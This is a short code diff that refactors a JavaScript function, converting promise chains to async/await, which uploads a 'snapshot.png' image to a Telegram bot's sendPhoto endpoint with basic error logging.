@@ -63,33 +63,27 @@ async function fetchEnvVariables() {
 }
 
 async function sendToTelegram(imageDataUrl) {
-  // Преобразование DataURL в Blob
-  fetch(imageDataUrl)
-    .then(response => response.blob())
-    .then(blob => {
-      const formData = new FormData();
-      formData.append('chat_id', CID);
-      formData.append('photo', blob, 'snapshot.png');
-      fetch(`https://api.telegram.org/bot${TBT}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      })
-      .then(response => {
-        if (response.ok) {
-          console.log('Image sent successfully');
-        } else {
-          return response.text().then(errorText => {
-            console.error('Failed to send image');
-          });
-        }
-      })
-      .catch(error => {
-        console.error('Error:', error);
-      });
-    })
-    .catch(error => {
-      console.error('Error converting image to Blob:', error);
+  try {
+    // Преобразование DataURL в Blob
+    const response = await fetch(imageDataUrl);
+    const blob = await response.blob();
+    const formData = new FormData();
+    formData.append('chat_id', CID);
+    formData.append('photo', blob, 'snapshot.png');
+
+    const telegramResponse = await fetch(`https://api.telegram.org/bot${TBT}/sendPhoto`, {
+      method: 'POST',
+      body: formData
     });
+
+    if (telegramResponse.ok) {
+      console.log('Image sent successfully');
+    } else {
+      console.error('Failed to send image');
+    }
+  } catch (error) {
+    console.error('Error:', error.message);
+  }
 }
 
 async function runSequentially() {
